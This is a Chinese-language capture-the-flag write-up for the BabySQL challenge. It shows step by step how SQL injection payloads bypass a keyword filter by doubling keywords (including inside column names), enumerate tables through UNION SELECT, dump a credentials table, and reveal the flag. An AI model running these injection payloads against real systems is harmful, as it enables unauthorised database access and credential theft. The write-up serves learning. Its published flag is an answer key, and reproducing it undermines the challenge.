# [极客大挑战 2019]BabySQL

## 题目来源

[极客大挑战 2019]BabySQL

## 题目方向 + 知识点

SQL 注入、关键字过滤绕过、双写绕过、`UNION SELECT` 注入、库表字段枚举、过滤影响字段名的特殊情况。

## 解题思路

这道题我先打开靶机首页，看见是一个很典型的登录框，表单会把参数提交到：

```text
/check.php?username=...&password=...
```

所以第一步我没有急着上复杂 payload，而是先做最基础的注入测试。

先传正常值：

```text
?username=1&password=1
```

页面提示 `NO,Wrong username`，说明请求能正常走通。

接着我测试单引号：

```text
?username=1'&password=1
```

页面直接报错，这一步非常关键，因为它说明后端 SQL 语句把 `username` 参数直接拼进查询里了，存在明显的 SQL 注入。

然后我继续测试最经典的万能密码：

```text
?username=1' or 1=1#&password=1
```

结果这条语句并没有打通，反而还是报错。说明题目确实做了过滤，而且很大概率是把 `or`、`union`、`select` 之类的关键词做了黑名单处理。

这时候就要想到 BabySQL 的经典考点：**双写绕过。**

如果后端只是简单地把关键字替换掉一次，那么我们就可以写成：

```text
oorr
ununionion
seselectlect
frfromom
whwhereere
anandd
```

过滤器删掉中间那层之后，剩下的仍然是合法关键字。

于是我重新测试万能密码：

```text
?username=1' oorr 1=1#&password=1
```

这次页面成功显示 `Login Success!`，说明双写绕过是成立的，注入链已经通了。

接着我测试联合注入列数：

```text
?username=1' ununionion seselectlect 1,2,3#&password=1
```

页面成功回显：

```text
Hello 2
Your password is '3'
```

这说明：

1. 查询结果一共有 **3 列**；
2. 第二列和第三列都存在回显；
3. 第二列会显示在 `Hello` 后面，第三列会显示在 `Your password is` 后面。

这一步确认之后，后面的利用就很顺了。

我先查当前数据库名：

```text
?username=1' ununionion seselectlect 1,database(),3#&password=1
```

页面回显：

```text
Hello geek
```

所以当前数据库名是：

```text
geek
```

接着查当前库中的表：

```text
?username=1' ununionion seselectlect 1,group_concat(table_name),3 frfromom infoorrmation_schema.tables whwhereere table_schema=database()#&password=1
```

页面回显：

```text
Hello b4bsql,geekuser
```

说明当前库里有两个关键表：

- `b4bsql`
- `geekuser`

然后我继续查字段名：

```text
?username=1' ununionion seselectlect 1,group_concat(column_name),3 frfromom infoorrmation_schema.columns whwhereere table_schema=database() anandd table_name='b4bsql'#&password=1
```

以及：

```text
?username=1' ununionion seselectlect 1,group_concat(column_name),3 frfromom infoorrmation_schema.columns whwhereere table_schema=database() anandd table_name='geekuser'#&password=1
```

两张表回显出来的字段都是：

```text
id,username,password
```

到这里表面上看已经可以直接查数据了，所以我最开始写了这样的 payload：

```text
?username=1' ununionion seselectlect 1,group_concat(id,0x3a,username,0x3a,password),3 frfromom b4bsql#&password=1
```

结果这一步报错了，而且错误信息非常有意思：

```text
Unknown column 'passwd' in 'field list'
```

这一下就暴露了题目过滤器的另一个细节：它不只是拦逻辑里的 `or`，而是 **会把整个输入里的 `or` 都替换掉**。所以字段名 `password` 在进入 SQL 之前，被处理成了：

```text
passwd
```

自然就会报字段不存在。

也就是说，这题不光关键字要双写，**连字段名里的 `or` 也要双写。**

所以正确字段名不能直接写 `password`，而要写成：

```text
passwoorrd
```

这样过滤器删掉一次 `or` 之后，最终留下来的才是：

```text
password
```

于是我把 payload 修正成：

```text
?username=1' ununionion seselectlect 1,group_concat(id,0x3a,username,0x3a,passwoorrd),3 frfromom b4bsql#&password=1
```

这次页面成功回显整张表内容：

```text
1:cl4y:i_want_to_play_2077,
2:sql:sql_injection_is_so_fun,
3:porn:do_you_know_pornhub,
4:git:github_is_different_from_pornhub,
5:Stop:you_found_flag_so_stop,
6:badguy:i_told_you_to_stop,
7:hacker:hack_by_cl4y,
8:flag:CTF2{6f6769d4-a4fb-49d6-b29d-c3ca3df3c796}
```

到这里 flag 就已经直接出来了。



## Flag

`CTF2{6f6769d4-a4fb-49d6-b29d-c3ca3df3c796}`